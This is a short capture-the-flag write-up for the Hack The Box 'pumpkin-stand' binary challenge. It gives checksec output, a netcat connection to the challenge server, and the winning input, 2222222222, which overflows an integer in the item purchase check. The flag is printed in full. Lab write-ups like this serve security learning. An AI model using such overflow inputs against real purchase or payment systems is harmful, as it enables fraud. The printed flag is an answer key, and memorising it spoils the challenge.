# PUMPKIN-STAND

## FLAG: HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}

## Status: Complete

+ DOCKER: YES
+ DOWNLOADABLE: YES

Description: This time of the year, we host our big festival and the one who craves the pumpkin faster and make it as scary as possible, gets an amazing prize! Be fast and try to crave this hard pumpkin!

## NOTES

1. > file pumpkin_stand
   1. pumpkin_stand: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fbbc6afe5dc2e791b38dfc19dbce5ab57c4a915e, not stripped

2. Run the file
   1. > ./pumpkin_stand
   2. Current pumpcoins: [1337]
        Items:
            Shovel  (1337 p.c.)
            Laser   (9999 p.c.)
        >> select item

3. > checksec ./pumpkin_stand
   1. RESULTS
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
        RUNPATH:  b'./glibc/'

### - DOCKER SPINUP TO GET ACTUAL FLAG

1. Now let's spin up the docker instance and run this against the server
   1. > nc 167.71.137.174 31410
2. Current pumpcoins: [1337]
    Items:
        Shovel  (1337 p.c.)
        Laser   (9999 p.c.)
    >> select item
    1. > 2 (select the lazer)
    2. > 2222222222 (overflow the integer)
    3. "Congratulations, here is the code to get your laser:" HTB{1nt3g3R_0v3rfl0w_101_0r_0v3R_9000!}
